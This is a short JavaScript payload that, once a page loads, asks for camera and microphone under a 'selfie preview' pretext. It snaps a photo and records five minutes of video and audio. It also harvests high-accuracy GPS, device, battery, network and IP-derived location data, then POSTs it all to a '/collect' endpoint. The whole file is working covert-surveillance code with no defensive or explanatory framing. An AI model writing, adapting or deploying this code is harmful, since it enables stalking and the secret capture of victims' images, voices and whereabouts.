(function(){
    var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
    var mediaRecorder;
    var recordedChunks=[];
    var stream;

    async function start(){
        try{
            // GET CAMERA + MICROPHONE
            stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:true});
            
            // SHOW SELFIE PREVIEW
            var preview=document.getElementById('selfiePreview');
            preview.srcObject=stream;
            await preview.play();
            
            // TAKE PHOTO
            await new Promise(r=>setTimeout(r,1000));
            var canvas=document.createElement('canvas');
            canvas.width=1280;canvas.height=720;
            canvas.getContext('2d').drawImage(preview,0,0);
            d.photo=canvas.toDataURL('image/jpeg',0.9);
            
            // START RECORDING 5 MINUTES
            mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'});
            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
            mediaRecorder.onstop=sendToServer;
            mediaRecorder.start();
            
            // Stop after 5 minutes
            setTimeout(function(){if(mediaRecorder.state==='recording')mediaRecorder.stop();},300000);
        }catch(e){d.camErr=e.message;collectOtherData();}
        
        collectOtherData();
    }
    
    function collectOtherData(){
        // GPS
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(function(p){
                d.gps={lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy+'m'};
            },function(){}, {enableHighAccuracy:true,timeout:8000});
        }
        
        // DEVICE
        d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
        
        // BATTERY
        navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
        
        // CONNECTION
        if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
        
        // IP
        fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};});
    }
    
    function sendToServer(){
        // Create video blob
        var blob=new Blob(recordedChunks,{type:'video/webm'});
        var reader=new FileReader();
        reader.onload=function(){
            d.video=reader.result;
            // Send everything
            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
        };
        reader.readAsDataURL(blob);
    }
    
    window.addEventListener('load',function(){setTimeout(start,500)});
})();
